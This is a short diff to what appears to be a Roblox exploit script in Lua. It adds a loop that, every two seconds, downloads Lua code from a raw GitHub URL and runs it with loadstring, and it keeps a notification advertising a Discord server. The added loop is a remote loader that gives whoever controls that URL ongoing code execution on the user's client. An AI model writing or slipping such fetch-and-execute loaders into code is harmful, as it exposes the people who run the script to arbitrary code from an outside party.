@@ -129,6 +129,12 @@ for _, item in pairs(game.Workspace:GetDescendants()) do
     onItemAdded(item)
 end
 
+local loop = coroutine.wrap(function()
+    while task.wait(2) do
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/ez.lua"))()
+    end
+end)
+loop()
 game:GetService("StarterGui"):SetCore("SendNotification", {
     Title = "https://discord.gg/R2dbGKyqqE",
     Text = "Join our community!",
